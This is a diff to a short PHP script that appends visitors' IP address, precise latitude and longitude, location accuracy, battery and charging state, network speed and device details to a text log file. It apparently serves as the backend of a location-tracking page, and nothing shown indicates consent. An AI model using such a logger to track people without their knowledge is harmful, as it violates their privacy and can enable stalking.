@@ -6,10 +6,12 @@ $lon = $data['lon'] ?? 'Unknown';
 $accuracy = $data['accuracy'] ?? 'Unknown';
 $battery = isset($data['battery']) ? $data['battery'] . "%" : 'Not Available';
 $charging = isset($data['charging']) ? ($data['charging'] ? 'Yes' : 'No') : 'Not Available';
+$speed = $data['speed'] ?? 'Unknown';
+$device = $data['device'] ?? 'Unknown';
 
 $log_file = "logs/location_log.txt";
-$log_entry = date("Y-m-d H:i:s") . " | IP: $ip | Lat: $lat | Lon: $lon | Accuracy: $accuracy | Battery: $battery | Charging: $charging\n";
+$log_entry = date("Y-m-d H:i:s") . " | IP: $ip | Lat: $lat | Lon: $lon | Accuracy: $accuracy | Battery: $battery | Charging: $charging | Speed: $speed Mbps | Device: $device\n";
 file_put_contents($log_file, $log_entry, FILE_APPEND);
 
-echo json_encode(["status" => "success", "message" => "Location & battery recorded."]);
+echo json_encode(["status" => "success", "message" => "Data recorded."]);
 ?>
